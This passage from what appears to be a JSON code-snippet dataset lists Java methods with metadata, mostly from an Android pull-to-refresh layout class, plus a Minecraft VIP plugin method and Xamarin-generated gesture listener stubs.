\u5982\u679c\u8fbe\u52303/4\uff0c\u5219\u5168\u90e8\u5c55\u5f00\n                        footerH = maxFooterH;\n                        // \u6b64\u65f6Recycleview\u8fd8\u6709\u6709\u70b9\u6ca1\u6709\u7f6e\u5e95\uff0c\u6211\u4eec\u6eda\u52a8\u4e00\u4e0b\n                        recyclerView.scrollToPosition(recyclerView.getAdapter().getItemCount() - 1);\n                    }\n                }\n                requestLayout();\n                Log.e(\"HLRefreshLayout t UP\", \"UP\");\n                break;\n        }\n        return super.dispatchTouchEvent(ev);\n    }", "url": "https://raw.githubusercontent.com/FanChael/MVVM/master/librarys/lib_refreshlayout/src/main/java/com/hl/lib_refreshlayout/view/HLRefreshLayout.java", "stars": "14", "class_props": {"extends": "ViewGroup", "implements": null, "modifiers": ["public"]}}, {"id": 58898, "method_name": "onMeasure", "class_name": "HLRefreshLayout", "params": ["int", "int"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onMeasure(int widthMeasureSpec, int heightMeasureSpec) {\n        Log.e(TAG, \"onMeasure\");\n        // super.onMeasure(widthMeasureSpec, heightMeasureSpec);\n        // Footer\u3001Header\u9700\u8981\u6d4b\u91cf\u4e00\u628a\uff0c\u5426\u5219\u65e0\u6cd5\u83b7\u53d6\u5230\u4f4d\u7f6e\n        //        lClassFooter.measure(widthMeasureSpec, heightMeasureSpec);\n        //        lClassHeader.measure(widthMeasureSpec, heightMeasureSpec);\n\n        /***\u81ea\u884c\u6d4b\u91cf***/\n        // ViewGroup\u7684\u6700\u5927\u5bbd\u5ea6\u548c\u9ad8\u5ea6\n        int maxWidth = 0;\n        int maxHeight = 0;\n\n        /**\u6d4b\u91cf\u5b50\u63a7\u4ef6*/\n        int childViewCount = getChildCount();\n        for (int i = 0; i < childViewCount; ++i) {\n            View view = getChildAt(i);\n            if (view.getVisibility() != GONE) {\n                // \u83b7\u53d6\u5b50\u63a7\u4ef6\u7684\u5c5e\u6027 - \u6682\u65f6\u672a\u8003\u8651margin\uff0cpadding\u7684\u60c5\u51b5\n                ViewGroup.LayoutParams layoutParams = view.getLayoutParams();\n                //                // \u6d4b\u91cf\u5b50\u63a7\u4ef6\u7684\u5bbd\u9ad8\n                //                final int childWidthMeasureSpec = getChildMeasureSpec(widthMeasureSpec, 0, layoutParams.width);\n                //                final int childHeightMeasureSpec = getChildMeasureSpec(heightMeasureSpec, 0, layoutParams.height);\n                //                // \u7136\u540e\u771f\u6b63\u6d4b\u91cf\u4e0b\u5b50\u63a7\u4ef6 - \u5230\u8fd9\u4e00\u6b65\u6211\u4eec\u5c31\u5bf9\u5b50\u63a7\u4ef6\u8fdb\u884c\u4e86\u5bbd\u9ad8\u7684\u8bbe\u7f6e\u4e86\u54af\n                //                view.measure(childWidthMeasureSpec, childHeightMeasureSpec);\n                // \u7b80\u5316\u4e0a\u9762\u7684\u8c03\u7528\n                measureChild(view, widthMeasureSpec, heightMeasureSpec);\n\n                // \u7136\u540e\u518d\u6b21\u83b7\u53d6\u771f\u6b63\u7684\u5b50\u63a7\u4ef6\u7684\u5bbd\u9ad8\u5c5e\u6027\n                // layoutParams = view.getLayoutParams();\n                // \u83b7\u53d6\u6700\u5927\u5bbd\u5ea6\u548c\u9ad8\u5ea6\u7684\u7d2f\u52a0\u503c\uff08\u5728ViewGroup\u5185\u5bb9\u5305\u88f9\u7684\u60c5\u51b5\u4e0b\uff0c\u9700\u8981\u7528\u6765\u8bbe\u7f6e\u6574\u4e2a\u7ec4\u5408\u63a7\u4ef6\u7684\u5bbd\u9ad8)\n                maxWidth = Math.max(maxWidth, view.getMeasuredWidth());\n                if (view instanceof RecyclerView) {\n                    maxHeight += view.getMeasuredHeight();\n                }\n            }\n        }\n\n        /**\u6d4b\u91cfViewGroup**/\n        // \u7136\u540e\u518d\u4e0e\u5bb9\u5668\u672c\u8eab\u7684\u6700\u5c0f\u5bbd\u9ad8\u5bf9\u6bd4\uff0c\u53d6\u5176\u6700\u5927\u503c - \u6709\u4e00\u79cd\u60c5\u51b5\u5c31\u662f\u5e26\u80cc\u666f\u56fe\u7247\u7684\u5bb9\u5668\uff0c\u8981\u8003\u8651\u56fe\u7247\u5c3a\u5bf8\n        maxWidth = Math.max(maxWidth, getMinimumWidth());\n        maxHeight = Math.max(maxHeight, getMinimumHeight());\n\n        // \u7136\u540e\u6839\u636eViewGroup\u5bb9\u6613\u6a21\u5f0f\u8fdb\u884c\u5bf9\u5e94\u7684\u5bbd\u9ad8\u8bbe\u7f6e\n        int wSpecMode = MeasureSpec.getMode(widthMeasureSpec);\n        int wSize = MeasureSpec.getSize(widthMeasureSpec);\n        int hSpecMode = MeasureSpec.getMode(heightMeasureSpec);\n        int hSize = MeasureSpec.getSize(heightMeasureSpec);\n\n        // WrapContent\u6a21\u5f0f\n        if (wSpecMode == MeasureSpec.AT_MOST && hSpecMode == MeasureSpec.AT_MOST) {\n            setMeasuredDimension(maxWidth, maxHeight);\n        }\n        // \u7cbe\u786e\u5c3a\u5bf8\u7684\u6a21\u5f0f\n        else if (wSpecMode == MeasureSpec.EXACTLY && hSpecMode == MeasureSpec.EXACTLY) {\n            setMeasuredDimension(wSize, hSize);\n        }\n        // \u5bbd\u5ea6\u7cbe\u786e\u5c3a\u5bf8\uff0c\u9ad8\u5ea6\u5185\u5bb9\u5305\u88f9\n        else if (wSpecMode == MeasureSpec.EXACTLY && hSpecMode == MeasureSpec.AT_MOST) {\n            setMeasuredDimension(wSize, maxHeight);\n        }\n        // \u9ad8\u5ea6\u7cbe\u786e\u5c3a\u5bf8\uff0c\u5bbd\u5ea6\u5185\u5bb9\u5305\u88f9\n        else if (hSpecMode == MeasureSpec.EXACTLY && wSpecMode == MeasureSpec.AT_MOST) {\n            setMeasuredDimension(maxWidth, hSize);\n        }\n        // \u5bbd\u5ea6\u5c3a\u5bf8\u4e0d\u786e\u5b9a\uff0c\u9ad8\u5ea6\u786e\u5b9a\n        else if (wSpecMode == MeasureSpec.UNSPECIFIED) {\n            setMeasuredDimension(maxWidth, hSize);\n        }\n        // \u9ad8\u5ea6\u5c3a\u5bf8\u4e0d\u786e\u5b9a\uff0c\u5bbd\u5ea6\u786e\u5b9a\n        else if (hSpecMode == MeasureSpec.UNSPECIFIED) {\n            setMeasuredDimension(wSize, maxHeight);\n        }\n    }", "url": "https://raw.githubusercontent.com/FanChael/MVVM/master/librarys/lib_refreshlayout/src/main/java/com/hl/lib_refreshlayout/view/HLRefreshLayout.java", "stars": "14", "class_props": {"extends": "ViewGroup", "implements": null, "modifiers": ["public"]}}, {"id": 58899, "method_name": "onLayout", "class_name": "HLRefreshLayout", "params": ["boolean", "int", "int", "int", "int"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onLayout(boolean changed, int l, int t, int r, int b) {\n        Log.e(TAG, \"onLayout\");\n\n        // ///< \u83b7\u53d6\u8303\u56f4\u521d\u59cb\u5de6\u4e0a\u89d2 - \u8fd9\u4e2a\u51b3\u5b9a\u5b50\u63a7\u4ef6\u7ed8\u5236\u7684\u4f4d\u7f6e\uff0c\u6211\u4eec\u7ed8\u5236\u7406\u8bba\u53ef\u4ee5\u4ece0,0\u5f00\u59cb\uff0cmargin\u5bb9\u5668\u672c\u8eab\u5df2\u7ecf\u8003\u8651\u8fc7\u4e86...\u6240\u4ee5\u522b\u548cmargin\u6df7\u6dc6\u4e86\n        int leftPos = getPaddingLeft();\n        int topPos = getPaddingTop();\n\n        ///< \u83b7\u53d6\u8303\u56f4\u521d\u59cb\u53f3\u4e0b\u89d2 - \u5982\u679c\u8003\u8651\u63a7\u4ef6\u7684\u4f4d\u7f6e\uff0c\u6bd4\u5982\u9760\u53f3\uff0c\u9760\u4e0b\u7b49\u53ef\u80fd\u5c31\u8981\u5229\u7528\u53f3\u4e0b\u89d2\u8303\u56f4\u6765\u8fdb\u884c\u8303\u56f4\u8ba1\u7b97\u4e86...\n        ///< \u540e\u9762\u6211\u4eec\u9010\u6b65\u5b8c\u5584\u63a7\u4ef6\u7684\u65f6\u5019\u7528\u4f1a\u7528\u5230\u8fd9\u91cc...\n        //int rightPos = right - left - getPaddingRight();\n        //int rightBottom = bottom - top - getPaddingBottom();\n\n        int count = getChildCount();\n        for (int i = 0; i < count; ++i) {\n            View childView = getChildAt(i);\n\n            ///< \u63a7\u4ef6\u5360\u4f4d\u7684\u60c5\u51b5\u4e0b\u8fdb\u884c\u8ba1\u7b97\n            if (childView.getVisibility() != GONE) {\n                int childW = childView.getMeasuredWidth();\n                int childH = childView.getMeasuredHeight();\n\n                // \u8ba1\u7b97\u63a7\u4ef6\u7684\u4e0a\u4e0b\u5de6\u53f3\u8303\u56f4\n                int cleft = leftPos;\n                int cright = cleft + childW;\n                int ctop = topPos;\n                int cbottom = ctop + childH;\n\n                if (!(childView instanceof LClassFooter) &&\n                        !(childView instanceof LClassHeader)) {\n                    ///< \u4e0b\u4e00\u4e2a\u63a7\u4ef6\u7684\u5de6\u4e0a\u89d2\u9700\u8981\u5411y\u8f74\u79fb\u52a8\u4e0a\u4e00\u4e2a\u63a7\u4ef6\u7684\u9ad8\u5ea6 - \u4e0d\u7136\u90fd\u91cd\u53e0\u4e86!\n                    topPos += childH;\n                }\n\n                // \u8bb0\u5f55Recycleview\uff0c\u4e4b\u540e\u505a\u52a0\u8f7d\u66f4\u591a\u63d0\u793a\u7b49\u64cd\u4f5c\n                if (childView instanceof RecyclerView) {\n                    recyclerView = (RecyclerView) childView;\n                    //customLinearLayoutManager = (CustomLinearLayoutManager) recyclerView.getLayoutManager();\n                    childView.layout(cleft, ctop + headerH, cright, cbottom - footerH);\n                    topPos -= footerH;\n                } else {\n                    childView.layout(cleft, ctop, cright, cbottom);\n                }\n            }\n        }\n\n        // Footer\u5b50\u63a7\u4ef6\u6446\u653e\n        if (null != recyclerView && null != lClassFooter && bLoadMoreData) {\n            //            if (null != lClassFooter.getParent() &&\n            //                    lClassFooter.getParent() instanceof ViewGroup) {\n            //                ViewGroup parent = (ViewGroup) lClassFooter.getParent();\n            //                parent.removeView(lClassFooter);\n            //            }\n            //            addView(lClassFooter, LinearLayout.LayoutParams.MATCH_PARENT, maxFooterH);\n            lClassFooter.layout(leftPos, topPos,\n                    leftPos + recyclerView.getWidth(),\n                    topPos + footerH);\n\n            // \u65d7\u4e0b\u7684\u5b50\u63a7\u4ef6\u4e5f\u9700\u8981\u6446\u653e\n            int footerChildCount = lClassFooter.getChildCount();\n            for (int i = 0; i < footerChildCount; ++i) {\n                View fooView = lClassFooter.getChildAt(i);\n\n                if (fooView.getVisibility() != GONE) {\n                    int fl = fooView.getLeft();\n                    int fr = fooView.getRight();\n                    int ft = fooView.getTop();\n                    int fb = fooView.getBottom();\n                    // \u4e00\u4e9b\u8c03\u8bd5\u53c2\u6570\n                    //                    LinearLayout.LayoutParams flayoutParams = (LinearLayout.LayoutParams) fooView.getLayoutParams();\n                    //                    int fChildW = flayoutParams.width;\n                    //                    int fChildH = flayoutParams.height;\n                    //                    Rect viewRect = new Rect();\n                    //                    int[] poss = new int[2];\n                    //                    fooView.getLocationInSurface(poss);\n                    fooView.layout(fl, ft, fr, fb);\n                }\n            }\n\n            // \u5982\u4e0b\u4e4b\u524d\u8c03\u8bd5\u7528\u7684\n            //                        TextView textView = new TextView(getContext());\n            //                        textView.setText(\"\u5185\u5bb9\u5305\u88f9\");\n            //                        textView.setTextColor(Color.parseColor(\"#03DAC5\"));\n            //                        textView.setGravity(Gravity.CENTER);\n            //                        textView.setBackgroundColor(Color.parseColor(\"#FF0000\"));\n            //                        textView.setTextSize(TypedValue.COMPLEX_UNIT_SP, 20);\n            //                        //ViewGroup.LayoutParams layoutParams = new ViewGroup.LayoutParams(LayoutParams.MATCH_PARENT, LayoutParams.MATCH_PARENT);\n            //                        addView(textView);\n            //                        textView.layout(leftPos, topPos,\n            //                                leftPos + recyclerView.getWidth(),\n            //                                topPos + 100);\n        }\n\n        // Header\u5b50\u63a7\u4ef6\u6446\u653e\n        if (null != recyclerView && null != lClassHeader && bRefreshData) {\n            //            if (null != lClassHeader.getParent() &&\n            //                    lClassHeader.getParent() instanceof ViewGroup) {\n            //                ViewGroup parent = (ViewGroup) lClassHeader.getParent();\n            //                parent.removeView(lClassHeader);\n            //            }\n            //            addView(lClassHeader, LinearLayout.LayoutParams.MATCH_PARENT, maxHeaderH);\n            lClassHeader.layout(leftPos, 0,\n                    leftPos + recyclerView.getWidth(),\n                    0 + headerH);\n\n            // \u65d7\u4e0b\u7684\u5b50\u63a7\u4ef6\u4e5f\u9700\u8981\u6446\u653e\n            int headerChildCount = lClassHeader.getChildCount();\n            for (int i = 0; i < headerChildCount; ++i) {\n                View heaView = lClassHeader.getChildAt(i);\n\n                if (heaView.getVisibility() != GONE) {\n                    int fl = heaView.getLeft();\n                    int fr = heaView.getRight();\n                    int ft = heaView.getTop();\n                    int fb = heaView.getBottom();\n                    // \u4e00\u4e9b\u8c03\u8bd5\u53c2\u6570\n                    //                    LinearLayout.LayoutParams flayoutParams = (LinearLayout.LayoutParams) fooView.getLayoutParams();\n                    //                    int fChildW = flayoutParams.width;\n                    //                    int fChildH = flayoutParams.height;\n                    //                    Rect viewRect = new Rect();\n                    //                    int[] poss = new int[2];\n                    //                    fooView.getLocationInSurface(poss);\n                    heaView.layout(fl, ft, fr, fb);\n                }\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/FanChael/MVVM/master/librarys/lib_refreshlayout/src/main/java/com/hl/lib_refreshlayout/view/HLRefreshLayout.java", "stars": "14", "class_props": {"extends": "ViewGroup", "implements": null, "modifiers": ["public"]}}, {"id": 58900, "method_name": "onDetachedFromWindow", "class_name": "HLRefreshLayout", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onDetachedFromWindow() {\n        Log.e(TAG, \"onDetachedFromWindow\");\n        super.onDetachedFromWindow();\n        recyclerView = null;\n        //customLinearLayoutManager = null;\n    }", "url": "https://raw.githubusercontent.com/FanChael/MVVM/master/librarys/lib_refreshlayout/src/main/java/com/hl/lib_refreshlayout/view/HLRefreshLayout.java", "stars": "14", "class_props": {"extends": "ViewGroup", "implements": null, "modifiers": ["public"]}}, {"id": 58901, "method_name": "setOnRefreshListenner", "class_name": "HLRefreshLayout", "params": ["RefreshListenner"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setOnRefreshListenner(RefreshListenner onRefreshListenner) {\n        this.refreshListenner = onRefreshListenner;\n    }", "url": "https://raw.githubusercontent.com/FanChael/MVVM/master/librarys/lib_refreshlayout/src/main/java/com/hl/lib_refreshlayout/view/HLRefreshLayout.java", "stars": "14", "class_props": {"extends": "ViewGroup", "implements": null, "modifiers": ["public"]}}, {"id": 58902, "method_name": "autoRefresh", "class_name": "HLRefreshLayout", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void autoRefresh(){\n        load_state =State.START_REFRESH;\n        headerH = maxHeaderH;\n        load_state = State.REFRESHING;\n        lClassHeader.setFreshData();\n        if (null != refreshListenner) {\n            refreshListenner.OnRefresh();\n        }\n        requestLayout();\n    }", "url": "https://raw.githubusercontent.com/FanChael/MVVM/master/librarys/lib_refreshlayout/src/main/java/com/hl/lib_refreshlayout/view/HLRefreshLayout.java", "stars": "14", "class_props": {"extends": "ViewGroup", "implements": null, "modifiers": ["public"]}}, {"id": 58903, "method_name": "finishLoadMore", "class_name": "HLRefreshLayout", "params": ["long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void finishLoadMore(long seconds) {\n        if (load_state == State.REFRESHING) {\n            return;\n        }\n\n        Message message = handler.obtainMessage();\n        message.what = State.LOAD_FINISH.ordinal();\n        handler.sendMessageAtTime(message, SystemClock.uptimeMillis() + seconds * 1000);\n    }", "url": "https://raw.githubusercontent.com/FanChael/MVVM/master/librarys/lib_refreshlayout/src/main/java/com/hl/lib_refreshlayout/view/HLRefreshLayout.java", "stars": "14", "class_props": {"extends": "ViewGroup", "implements": null, "modifiers": ["public"]}}, {"id": 58904, "method_name": "finishLoadMore", "class_name": "HLRefreshLayout", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void finishLoadMore() throws Exception {\n        if (Thread.currentThread() != Looper.getMainLooper().getThread()) {\n            throw new Exception(\"\u975eUI\u7ebf\u7a0b\u4e0d\u80fd\u8fdb\u884c\u63a7\u4ef6\u64cd\u4f5c!\");\n        }\n\n        // \u6807\u5fd7\u5237\u65b0\u7ed3\u675f\n        load_state = State.NONE;\n        // RV\u6b64\u65f6\u53ef\u6ed1\u52a8\n        //customLinearLayoutManager.setScrollEnabled(true);\n        // \u7ed3\u675f\u52a0\u8f7d\u66f4\u591a\u52a8\u753b\n        lClassFooter.onFinish();\n        // Footer\u6d88\u5931\n        footerH = 0;\n        requestLayout();\n        if (null != refreshListenner) {\n            refreshListenner.OnLoadMoreFinish();\n        }\n    }", "url": "https://raw.githubusercontent.com/FanChael/MVVM/master/librarys/lib_refreshlayout/src/main/java/com/hl/lib_refreshlayout/view/HLRefreshLayout.java", "stars": "14", "class_props": {"extends": "ViewGroup", "implements": null, "modifiers": ["public"]}}, {"id": 58905, "method_name": "finishRefresh", "class_name": "HLRefreshLayout", "params": ["long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void finishRefresh(long seconds) {\n        if (load_state == State.LOADING) {\n            return;\n        }\n\n        // \u5237\u65b0\u540e\u7f6e\u9876\u4e00\u4e0b\n        recyclerView.scrollToPosition(0);\n\n        Message message = handler.obtainMessage();\n        message.what = State.REFRESH_FINISH.ordinal();\n        handler.sendMessageAtTime(message, SystemClock.uptimeMillis() + seconds * 1000);\n    }", "url": "https://raw.githubusercontent.com/FanChael/MVVM/master/librarys/lib_refreshlayout/src/main/java/com/hl/lib_refreshlayout/view/HLRefreshLayout.java", "stars": "14", "class_props": {"extends": "ViewGroup", "implements": null, "modifiers": ["public"]}}, {"id": 58906, "method_name": "finishRefresh", "class_name": "HLRefreshLayout", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void finishRefresh() throws Exception {\n        if (Thread.currentThread() != Looper.getMainLooper().getThread()) {\n            throw new Exception(\"\u975eUI\u7ebf\u7a0b\u4e0d\u80fd\u8fdb\u884c\u63a7\u4ef6\u64cd\u4f5c!\");\n        }\n\n        // \u6807\u5fd7\u5237\u65b0\u7ed3\u675f\n        load_state = State.NONE;\n        // RV\u6b64\u65f6\u53ef\u6ed1\u52a8\n        //customLinearLayoutManager.setScrollEnabled(true);\n        // \u7ed3\u675f\u5237\u65b0\u52a8\u753b\n        lClassHeader.onFinish();\n        // Footer\u6d88\u5931\n        headerH = 0;\n        requestLayout();\n        if (null != refreshListenner) {\n            refreshListenner.OnRefreshFinish();\n        }\n\n        // \u5237\u65b0\u540e\u7f6e\u9876\u4e00\u4e0b\n        recyclerView.scrollToPosition(0);\n    }", "url": "https://raw.githubusercontent.com/FanChael/MVVM/master/librarys/lib_refreshlayout/src/main/java/com/hl/lib_refreshlayout/view/HLRefreshLayout.java", "stars": "14", "class_props": {"extends": "ViewGroup", "implements": null, "modifiers": ["public"]}}, {"id": 58907, "method_name": "setNoMoreData", "class_name": "HLRefreshLayout", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setNoMoreData() {\n        load_state = State.NOMORE_DATA;\n        footerH = 0;\n        lClassFooter.setNoMoreData();\n        requestLayout();\n    }", "url": "https://raw.githubusercontent.com/FanChael/MVVM/master/librarys/lib_refreshlayout/src/main/java/com/hl/lib_refreshlayout/view/HLRefreshLayout.java", "stars": "14", "class_props": {"extends": "ViewGroup", "implements": null, "modifiers": ["public"]}}, {"id": 58908, "method_name": "apply", "class_name": "Items", "params": ["Player", "VipType"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void apply(Player player, VipType type) {\n\n        if (!isPresent()) return;\n\n        for (ItemStack stack : getSection()) {\n            Stacks.give(player, stack);\n        }\n\n    }", "url": "https://raw.githubusercontent.com/devwckd/wckd-vips/master/src/main/java/co/wckd/vips/entity/section/Items.java", "stars": "2", "class_props": {"extends": "VipSection", "implements": null, "modifiers": ["public"]}}, {"id": 58909, "method_name": "onDown", "class_name": "ViewCellRenderer_ViewCellContainer_LongPressGestureListener", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean onDown (android.view.MotionEvent p0)\n\t{\n\t\treturn n_onDown (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ViewCellRenderer_ViewCellContainer_LongPressGestureListener.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 58910, "method_name": "n_onDown", "class_name": "ViewCellRenderer_ViewCellContainer_LongPressGestureListener", "params": ["android"], "throws": null, "modifiers": ["private", "native"], "return_type": "boolean", "snippet": "\tprivate native boolean n_onDown (android.view.MotionEvent p0);\n\n\n\tpublic boolean onFling (android.view.MotionEvent p0, android.view.MotionEvent p1, float p2, float p3)\n\t{\n\t\treturn n_onFling (p0, p1, p2, p3);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ViewCellRenderer_ViewCellContainer_LongPressGestureListener.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 58911, "method_name": "onFling", "class_name": "ViewCellRenderer_ViewCellContainer_LongPressGestureListener", "params": ["android", "android", "float", "float"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean onFling (android.view.MotionEvent p0, android.view.MotionEvent p1, float p2, float p3)\n\t{\n\t\treturn n_onFling (p0, p1, p2, p3);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ViewCellRenderer_ViewCellContainer_LongPressGestureListener.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 58912, "method_name": "n_onFling", "class_name": "ViewCellRenderer_ViewCellContainer_LongPressGestureListener", "params": ["android", "android", "float", "float"], "throws": null, "modifiers": ["private", "native"], "return_type": "boolean", "snippet": "\tprivate native boolean n_onFling (android.view.MotionEvent p0, android.view.MotionEvent p1, float p2, float p3);\n\n\n\tpublic void onLongPress (android.view.MotionEvent p0)\n\t{\n\t\tn_onLongPress (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ViewCellRenderer_ViewCellContainer_LongPressGestureListener.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 58913, "method_name": "onLongPress", "class_name": "ViewCellRenderer_ViewCellContainer_LongPressGestureListener", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onLongPress (android.view.MotionEvent p0)\n\t{\n\t\tn_onLongPress (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ViewCellRenderer_ViewCellContainer_LongPressGestureListener.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 58914, "method_name": "n_onLongPress", "class_name": "ViewCellRenderer_ViewCellContainer_LongPressGestureListener", "params": ["android"], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_onLongPress (android.view.MotionEvent p0);\n\n\n\tpublic boolean onScroll (android.view.MotionEvent p0, android.view.MotionEvent p1, float p2, float p3)\n\t{\n\t\treturn n_onScroll (p0, p1, p2, p3);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ViewCellRenderer_ViewCellContainer_LongPressGestureListener.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 58915, "method_name": "onScroll", "class_name": "ViewCellRenderer_ViewCellContainer_LongPressGestureListener", "params": ["android", "android", "float", "float"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean onScroll (android.view.MotionEvent p0, android.view.MotionEvent p1, float p2, float p3)\n\t{\n\t\treturn n_onScroll (p0, p1, p2, p3);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ViewCellRenderer_ViewCellContainer_LongPressGestureListener.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 58916, "method_name": "n_onScroll", "class_name": "ViewCellRenderer_ViewCellContainer_LongPressGestureListener", "params": ["android", "android", "float", "float"], "throws": null, "modifiers": ["private", "native"], "return_type": "boolean", "snippet": "\tprivate native boolean n_onScroll (android.view.MotionEvent p0, android.view.MotionEvent p1, float p2, float p3);\n\n\n\tpublic void onShowPress (android.view.MotionEvent p0)\n\t{\n\t\tn_onShowPress (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ViewCellRenderer_ViewCellContainer_LongPressGestureListener.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 58917, "method_name": "onShowPress", "class_name": "ViewCellRenderer_ViewCellContainer_LongPressGestureListener", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onShowPress (android.view.MotionEvent p0)\n\t{\n\t\tn_onShowPress (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ViewCellRenderer_ViewCellContainer_LongPressGestureListener.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 58918, "method_name": "n_onShowPress", "class_name": "ViewCellRenderer_ViewCellContainer_LongPressGestureListener", "params": ["android"], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_onShowPress (android.view.MotionEvent p0);\n\n\n\tpublic boolean onSingleTapUp (android.view.MotionEvent p0)\n\t{\n\t\treturn n_onSingleTapUp (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ViewCellRenderer_ViewCellContainer_LongPressGestureListener.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 58919, "method_name": "onSingleTapUp", "class_name": "ViewCellRenderer_ViewCellContainer_LongPressGestureListener", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean onSingleTapUp (android.view.MotionEvent p0)\n\t{\n\t\treturn n_onSingleTapUp (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ViewCellRenderer_ViewCellContainer_LongPressGestureListener.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 58920, "method_name": "n_onSingleTapUp", "class_name": "ViewCellRenderer_ViewCellContainer_LongPressGestureListener", "params": ["android"], "throws": null, "modifiers": ["private", "native"], "return_type": "boolean", "snippet": "\tprivate native boolean n_onSingleTapUp (android.view.MotionEvent p0);\n\n\tprivate java.util.ArrayList refList;\n\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ViewCellRenderer_ViewCellContainer_LongPressGestureListener.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 58921, "method_name": "monodroidAddReference", "class_name": "ViewCellRenderer_ViewCellContainer_LongPressGestureListener", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ViewCellRenderer_ViewCellContainer_LongPressGestureListener.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 58922, "method_name": "monodroidClearReferences", "class_name": "ViewCellRenderer_ViewCellContainer_LongPressGestureListener", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\n\t{\n\t\tif (refList != null)\n\t\t\trefList.clear ();\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ViewCellRenderer_ViewCellContainer_LongPressGestureListener.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 58923, "method_name": "getId", "class_name": "Attachment", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getId() {\n        return id;\n    }", "url": 